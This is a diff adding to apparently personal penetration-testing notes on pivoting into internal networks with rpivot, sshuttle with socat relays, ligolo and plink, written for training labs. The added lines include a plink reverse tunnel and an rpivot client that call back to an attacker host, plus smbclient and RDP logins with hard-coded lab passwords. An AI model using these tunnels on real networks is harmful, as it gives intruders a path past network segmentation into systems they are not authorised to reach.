@@ -43,6 +43,12 @@ socks5 127.0.0.1 9998  //add to /etc/proxychains4.conf
 //client in this case initial access machine forwards traffic all ports to 2nd network ..  
 psql -h 127.0.0.1 -p 2345 -U postgres  //on kali forwards traffic to SQL server  
 
+**Rpivot**  
+git clone https://github.com/klsecservices/rpivot.git  
+python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0  //on kali  
+python2.7 client.py --server-ip 10.10.14.18 --server-port 9999  //connect to kali from client  
+proxychains wget 172.16.5.135:80    --- reach second net  
+
 **LigoloNG**   
 Use Ligolo-ng: when no ssh forwarding enabled on the box.  
 on kali:  
@@ -63,9 +69,36 @@ start    //start the tunneling on the newly created interface !!
 //Now the nmap or fping scans should work on the new network !!  
 
 **Sshuttle**  
+regular case..  
+sudo sshuttle -r username@remote-server-ip 10.1.2.0/24  //from kali to 2nd network  
+with a Twist ..  
+socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22   //listening on 2222 of first net, forwarding to 2nd net  
+sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24   //socat to reach 3rd network from kali via 1st net  
+kali@kali:~$ smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234   
 
 **Chisel**  
 
+## Windows  
+On Windows versions with SSH installed,  
+we will find scp.exe, sftp.exe, ssh.exe, along with other ssh-* utilities in %systemdrive%\Windows\System32\OpenSSH location by default  
+#### ssh.exe  
+same commands work, reverse forwarding mostly as ssh server not common on windows first target  
+try both remote and dynamic remote forwarding commands  
+think - case to case basis  
+
+#### ligolo - use windows client - works as well  
+
+#### plink.exe -- putty cli  
+no ssh client, then download plink.exe and establish  
+copy to target /usr/share/windows-resources/binaries/plink.exe  
+plink.exe -ssh -l kali -pw kalipassword -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4  //192 is kali ip
+//reverse port forwarding - starts listener on kali:9833 which forwards traffic to localhost 3389 when rdp is not exposed  
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833   //rdp to target  
+plink -ssh -D 9050 ubuntu@10.129.15.50  //so this is to ubuntu not windows or can be windows if ssh running..  
+
+#### Netsh  
+requires admin privileges on windows target to create route and enable firewall rules  
+google !! too much  
+
 **Labs**:  
 Enterprise, Inception, REddish, Dante, Offshore, Rasta, Ascension  
-
